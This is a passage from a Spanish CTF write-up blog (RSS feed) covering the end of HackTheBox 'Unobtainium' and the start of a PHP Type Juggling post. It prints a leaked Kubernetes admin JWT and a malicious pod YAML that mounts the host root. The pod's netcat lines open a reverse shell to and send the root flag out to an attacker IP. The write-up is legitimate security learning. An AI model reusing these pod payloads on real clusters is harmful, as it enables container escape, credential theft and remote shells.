&lt;p&gt;Les dejo el script por si quieren jugar con √©l, la explotaci√≥n es totalmente igual a la que hicimos, solo que en este caso jugamos con instrucciones de &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Tienen que validar que la IP que pongan exista, ya que se generan aleatoriamente y pueda que antes de un reset exista la &lt;code&gt;172.17.0.5&lt;/code&gt; pero despu√©s no.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(El script genera de una vez una &lt;strong&gt;Reverse Shell&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;Lo movemos a la m√°quina, nos ponemos en escucha y ejecutamos de nuevo contra el servidor &lt;code&gt;http://172.17.0.5:3000&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_devnodeSH_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PERFECTISIMOOOOOOOOOOOOOOOOOOOOOOO, tamos ahora en uno de los contenedores del &lt;strong&gt;pod&lt;/strong&gt; &lt;code&gt;dev&lt;/code&gt;, que lindura :3&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;lateral-tokenadmin-found&quot;&gt;Encontramos token -secreto- del &lt;u&gt;admin&lt;/u&gt; y obtenemos interacci√≥n total con &lt;u&gt;Kubernetes&lt;/u&gt; &lt;a href=&quot;#lateral-tokenadmin-found&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumerando el sistema no encontramos nada distinto a los contenedores de &lt;code&gt;webapp&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Contamos de nuevo con los archivos para hablar con la API**:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@devnode-deployment-cd86fb5c-mvrfz:/var/run/secrets/kubernetes.io/serviceaccount$ ls  
ca.crt  namespace  token
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As√≠ que podemos intentar ver si ahora tenemos alg√∫n permiso distinto o si descartamos que sea por ac√°.&lt;/p&gt;

&lt;p&gt;En vez de jugar con &lt;code&gt;cURL&lt;/code&gt; subamos ‚Äú&lt;code&gt;kubito&lt;/code&gt;‚Äù que ya sabemos que vamos a obtener la misma info pero con un output m√°s est√©tico :D&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ curl http://10.10.14.146:8000/kubectl -o kubito
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Jugando, jugando y jugando encontramos algo destino al probar de nuevo el subcomando &lt;code&gt;auth can-i&lt;/code&gt; contra el &lt;strong&gt;namespace&lt;/strong&gt; &lt;code&gt;kube-system&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ ./kubito auth can-i --list -n kube-system
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos listar secretos de ese &lt;strong&gt;nombre de espacio&lt;/strong&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;üõ≥Ô∏è &lt;strong&gt;&lt;em&gt;&lt;code&gt;Secret&lt;/code&gt;: This is the place to store secret data like passwords, API keys, creds, etc. encoded in B64.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-kubernetes#kubernetes-secrets&quot;&gt;hacktricks&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Perfecto, para listarlos podemos apoyarnos del subcomando &lt;code&gt;get secrets&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ ./kubito get secrets -n kube-system       
NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      169d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      169d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      168d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      169d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      169d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      169d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      169d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      169d
default-token-l85f2                              kubernetes.io/service-account-token   3      169d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      169d
disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      169d
endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      169d
endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      169d
endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      169d
expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      169d
generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      169d
horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      169d
job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      169d
kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      169d
namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      169d
node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      169d
persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      169d
pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      169d
pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      169d
pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      169d
replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      169d
replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      169d
resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      169d
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      169d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      169d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      169d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      169d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      169d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      169d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      169d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listos, tenemos varios secretos, si nos fijamos en la columna &lt;code&gt;TYPE&lt;/code&gt; nos indica que todos son &lt;a href=&quot;https://kubernetes.io/docs/concepts/configuration/secret/#service-account-token-secrets&quot;&gt;kubernetes.io/service-account-token&lt;/a&gt;, que buscando un poco por la web entendemos que su contenido ser√° siempre un &lt;a href=&quot;https://jwt.io/introduction&quot;&gt;&lt;strong&gt;JSON Web Token&lt;/strong&gt;&lt;/a&gt;, o sea, con los que ya hemos tratado:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;(/run/secrets/kubernetes.io/serviceaccount/token)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre toooda la lista vemos algunos con nombre llamativo, pero hay dos que destacan:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-`bash&quot;&gt;* root-ca-cert-publisher-token-cnl86
* c-admin-token-tfmp2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de algunas pruebas (que ya veremos) nos quedamos con &lt;code&gt;c-admin-token-tfmp2&lt;/code&gt;, veamos su contenido:&lt;/p&gt;

&lt;p&gt;(Estoy en otro hostname, pero no importa, estamos en unos de los containers del &lt;strong&gt;pod&lt;/strong&gt; &lt;code&gt;devnode&lt;/code&gt; igualmente).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_devnodeSH_kubito_secret_admin.png&quot; alt=&quot;338bash_devnodeSH_kubito_secret_admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bien, una prueba que me llego a la cabeza fue intentar crear un &lt;strong&gt;pod&lt;/strong&gt; con nuestro token actual (&lt;code&gt;/run/secrets/kubernetes.io/serviceaccount/token&lt;/code&gt;), el token del secreto &lt;code&gt;root-ca-cert-publisher-token-cnl86&lt;/code&gt; y el token del secreto &lt;code&gt;c-admin-token-tfmp2&lt;/code&gt;, esta fue la raz√≥n por la que me quede con el token &lt;code&gt;c-admin-token-tfmp2&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tomando algunos ejemplos (como el de &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#escaping-from-the-pod&quot;&gt;hacktricks&lt;/a&gt; (cambiamos a &lt;code&gt;namespace: kube-system&lt;/code&gt;)) generamos nuestro archivo &lt;code&gt;.yaml&lt;/code&gt; y despu√©s para validar si podemos crearlo ejecutar√≠amos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito apply -f aaa.yaml -n kube-system       
Error from server (Forbidden)
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero indic√°ndole el token:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito apply -f aaa.yaml -n kube-system --token $TOKEN        
pod/attacker-pod created
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listoneeeeees, al parecer tenemos el token del usuario &lt;code&gt;admin&lt;/code&gt;, lo que quiere decir que tenemos interacci√≥n total contra &lt;strong&gt;Kubernetes&lt;/strong&gt;, pues ahora solo nos queda probar y probar cosas para ver con cu√°l logramos explotar esta locura (:&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Despu√©s de muchas pruebas en las que no estaba pensando, solo probaba y probaba (algo sin sentido :s), frene, mire la terminal y empece a pensar sobre lo que estaba intentando crear.&lt;/p&gt;

&lt;p&gt;Hubo varios recursos que use para probar, se los dejo por si algo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1&quot;&gt;Kubernetes Pentest Methodology Part 1&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#escaping-from-the-pod&quot;&gt;Escaping from the pod&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod&quot;&gt;Eight Ways to Create a Pod&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&quot;&gt;Bad Pods: Kubernetes Pod Privilege Escalation&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Y otros que perdi en el camino pensando que no me servian (pero estoy casi seguro que si).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Y finalmente este:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/&quot;&gt;Attacking Kubernetes through Kubelet&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Me quedo con este ultimo porque es sencillo de leer y adem√°s fue con el que me pare a pensar sobre que estaba haciendo y con el que finalmente logre crear cositas maliciosas‚Ä¶&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;malicious-pod&quot;&gt;Generamos &lt;u&gt;POD malicioso&lt;/u&gt; &lt;a href=&quot;#malicious-pod&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_access2THEnodes.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ese archivo &lt;code&gt;.yaml&lt;/code&gt; genera un &lt;strong&gt;pod&lt;/strong&gt; que cuando se crea nos devuelve una &lt;strong&gt;Reverse Shell&lt;/strong&gt; (adem√°s de montar la ra√≠z del sistema (&lt;code&gt;/&lt;/code&gt;) en una ruta llamada &lt;code&gt;/host&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Sencillito, nos copiamos ese texto y creamos el archivo &lt;code&gt;.yaml&lt;/code&gt; con nuestros comandos, para confirmar que el sistema &lt;strong&gt;host&lt;/strong&gt; tiene &lt;code&gt;nc&lt;/code&gt;, vamos a decirle que nos env√≠e el resultado del comando &lt;code&gt;id&lt;/code&gt; a nuestro listener:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: busybox
    image: busybox:1.29.2
    command: [&quot;/bin/sh&quot;]
    args: [&quot;-c&quot;, &quot;id | nc 10.10.14.146 4435&quot;]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora le indicamos que nos cree el &lt;strong&gt;pod&lt;/strong&gt; seg√∫n el contenido del archivo &lt;code&gt;.yaml&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
pod/test created
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validamos si se cre√≥:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito -n kube-system --token $TOKEN get pods
NAME                                  READY   STATUS             RESTARTS   AGE
...
test                                  0/1     ErrImagePull       0          6s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero hay errores, si volvemos a validar el sistema lo termina y despu√©s lo borra:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito -n kube-system --token $TOKEN get pods
NAME                                  READY   STATUS             RESTARTS   AGE
...
test                                  0/1     Terminating        0          8s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por lo tanto no se ejecuta nuestro comando‚Ä¶ Ac√° estuve un buen rato, &lt;strong&gt;probando y probando&lt;/strong&gt;. (Muchas pruebas e.e)&lt;/p&gt;

&lt;p&gt;Se me dio por leer los &lt;strong&gt;pods&lt;/strong&gt; que ya existen y comparar algunos campos con los de nuestro archivo &lt;code&gt;.yaml&lt;/code&gt; a ver si era que necesit√°bamos algo en especial, si los listamos vemos varios:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito -n kube-system --token $TOKEN get pods
NAME                                  READY   STATUS             RESTARTS   AGE
backup-pod                            0/1     CrashLoopBackOff   93         168d
coredns-74ff55c5b-sclll               1/1     Running            31         169d
etcd-unobtainium                      1/1     Running            0          117m
kube-apiserver-unobtainium            1/1     Running            0          117m
kube-controller-manager-unobtainium   1/1     Running            34         169d
kube-proxy-zqp45                      1/1     Running            31         169d
kube-scheduler-unobtainium            1/1     Running            31         169d
storage-provisioner                   1/1     Running            63         169d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leyendo el contenido del primer &lt;strong&gt;pod&lt;/strong&gt; (que esta como en alg√∫n tipo de error, pero no se borra (adem√°s su nombre el llamativo)) y comparando sus campos con los nuestros podemos copiar alg√∫n que otro contenido:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testea$ ./kubito -n kube-system --token $TOKEN describe pod backup-pod
Name:         backup-pod
Namespace:    kube-system
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Mon, 18 Jan 2021 16:34:56 +0000
Labels:       &amp;lt;none&amp;gt;
Annotations:  &amp;lt;none&amp;gt;
Status:       Running
IP:           172.17.0.9
IPs:
  IP:  172.17.0.9
Containers:
  backup-pod:
    Container ID:   docker://64a32a185ef0b218ddaaddb376725f3f709c7cc36b4f5872ebdf179819d189f4
    Image:          localhost:5000/dev-alpine
    Image ID:       docker-pullable://alpine@sha256:d9a7354e3845ea8466bb00b22224d9116b183e594527fb5b6c3d30bc01a20378
    Port:           &amp;lt;none&amp;gt;
    Host Port:      &amp;lt;none&amp;gt;                                                                      
    State:          Waiting         
      Reason:       CrashLoopBackOff
    Last State:     Terminated
      Reason:       Completed
      Exit Code:    0
      Started:      Mon, 05 Jul 2021 19:53:36 +0000
      Finished:     Mon, 05 Jul 2021 19:53:36 +0000
    Ready:          False
    Restart Count:  94
    Environment:    &amp;lt;none&amp;gt;
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-l85f2 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             False 
  ContainersReady   False 
  PodScheduled      True
Volumes:
  default-token-l85f2:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-l85f2
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  &amp;lt;none&amp;gt;
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:
  Type     Reason   Age                    From     Message
  ----     ------   ----                   ----     -------
  Warning  BackOff  4m4s (x532 over 118m)  kubelet  Back-off restarting failed container
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre algunos cambios que hice, el que me dio resultado fue el campo &lt;code&gt;Image&lt;/code&gt;, el cual vemos que es distinto al de nuestro archivo &lt;code&gt;.yaml&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Adem√°s vemos que ese &lt;strong&gt;pod&lt;/strong&gt; en concreto se comunica con el sistema host &lt;code&gt;unobtainium/10.10.10.235&lt;/code&gt;, eso tambi√©n me llamo a atenci√≥n‚Ä¶&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;aaa.yaml&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;image: busybox:1.29.2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;backup-pod&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;image: localhost:5000/dev-alpine
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Puede ser que nos est√© generando error por eso, ya que la imagen &lt;code&gt;busybox:1.29.2&lt;/code&gt; lo m√°s probable es que no exista y por el contrario &lt;code&gt;localhost:5000/dev-alpine&lt;/code&gt; si, pues copiemos esa imagen en nuestro &lt;strong&gt;pod&lt;/strong&gt; e intentemos crearlo de nuevo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: busybox
    image: localhost:5000/dev-alpine
    command: [&quot;/bin/sh&quot;]
    args: [&quot;-c&quot;, &quot;id | nc 10.10.14.146 4435&quot;]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yyyy en nuestro listenerrrrrr:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_maliciousPOD_nc_id.png&quot; alt=&quot;338bash_maliciousPOD_nc_id&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Peeeeeeeerfecto, tenemos ejecuci√≥n remota de comandos, pues entabl√©monos una reverse Shell:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: busybox
    image: localhost:5000/dev-alpine
    command: [&quot;/bin/sh&quot;]
    args: [&quot;-c&quot;, &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.146 4435 &amp;gt;/tmp/f&quot;]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;devnode&amp;gt;$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora en nuestro listener:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_maliciousPOD_revsh.png&quot; alt=&quot;338bash_maliciousPOD_revsh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero la perdemos muy r√°pido (a la vez que se borra el &lt;strong&gt;pod&lt;/strong&gt;), pero podemos aprovecharnos de la carpeta &lt;code&gt;/host&lt;/code&gt; que crea el &lt;strong&gt;pod&lt;/strong&gt; para leer la flag:&lt;/p&gt;

&lt;p&gt;(Podemos obtener una Shell constante de varias formas, ya es cuesti√≥n de su imaginaci√≥n)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;...
    args: [&quot;-c&quot;, &quot;cat /host/root/root.txt | nc 10.10.14.146 4435&quot;]
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338flags_root.png&quot; alt=&quot;338flags_root&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Intente algunas formas de conseguir una &lt;strong&gt;Shell&lt;/strong&gt; sin que se nos cierre pero no lo logre :(&lt;/p&gt;

&lt;p&gt;Veamos la flag de &lt;code&gt;user.txt&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338flags_user.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Vaya locura de m√°quina, me encanto la explotaci√≥n inicial, el juntar las dos vulnerabilidades para obtener un solo resultado, incre√≠ble, muy lindo :3 La parte de &lt;strong&gt;Kubernetes&lt;/strong&gt; fue una locura, mucho movimiento lateral.&lt;/p&gt;

&lt;p&gt;Bonita y entretenida m√°quina, aprendimos bastante y reforzamos cositas que sab√≠amos‚Ä¶&lt;/p&gt;

&lt;p&gt;Bueno, no siendo m√°s, muchas gracias por siempre aguantar :* Nos leeremos despu√©s yyyyy A SEGUIR ROMPIENDO TODOOOOOOOOOOOOO!!&lt;/p&gt;
</description>
        <pubDate>Mon, 30 Aug 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/unobtainium</link>
        <guid isPermaLink="true">http://localhost:4000/htb/unobtainium</guid>
        
        <category>kubernetes</category>
        
        <category>lodash</category>
        
        <category>google-cloudstorage-commands</category>
        
        <category>code-analysis</category>
        
        <category>node.js</category>
        
        <category>pivoting</category>
        
        
        <category>htb</category>
        
      </item>
    
      <item>
        <title>Type Juggling == PHP</title>
        <description>&lt;p&gt;Jugaremos con la &lt;strong&gt;pobre validaci√≥n&lt;/strong&gt; que se hace a veces en formularios o procesos de &lt;code&gt;PHP&lt;/code&gt;, estos llevados a cabo con &lt;code&gt;==&lt;/code&gt; o &lt;code&gt;!=&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;En este art√≠culo vamos a explorar una vulnerabilidad en c√≥digos de &lt;code&gt;PHP&lt;/code&gt; llamada &lt;code&gt;Type Juggling&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Aprovechar√© un reto de un &lt;strong&gt;CTF&lt;/strong&gt; creado por &lt;strong&gt;CERT RCTS&lt;/strong&gt; para explicar este tipo de vuln:&lt;/p&gt;

&lt;p&gt;üé≤ &lt;strong&gt;&lt;u&gt;Gracias&lt;/u&gt;&lt;/strong&gt; &lt;a href=&quot;https://defendingthesoc.ctf.cert.rcts.pt/&quot;&gt;&lt;strong&gt;&lt;u&gt;https://defendingthesoc.ctf.cert.rcts.pt/&lt;/u&gt;&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;D√©mosle‚Ä¶&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#desc-chall&quot;&gt;Descripci√≥n y exploraci√≥n del reto&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#code-analysis&quot;&gt;Exploramos y entendemos el c√≥digo &lt;strong&gt;PHP&lt;/strong&gt; del reto&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#testing-chall&quot;&gt;Hacemos algunos testeos en el programa&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#juggling&quot;&gt;Empezamos a conocernos con el &lt;strong&gt;Type Juggling&lt;/strong&gt;&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#overview-juggling&quot;&gt;¬øQu√© jeso del &lt;strong&gt;Type Juggling&lt;/strong&gt;?&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#exploit-juggling&quot;&gt;Explotamos el &lt;strong&gt;Type Juggling&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#py-juggling&quot;&gt;Automatizamos la b√∫squeda de la cadena que genera el bypass (&lt;strong&gt;Type Juggling&lt;/strong&gt;)&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#refs&quot;&gt;Referencias&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;desc-chall&quot;&gt;Vemos el reto &lt;a href=&quot;#desc-chall&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Some type of juggling&lt;/strong&gt;‚Ä¶&lt;/p&gt;

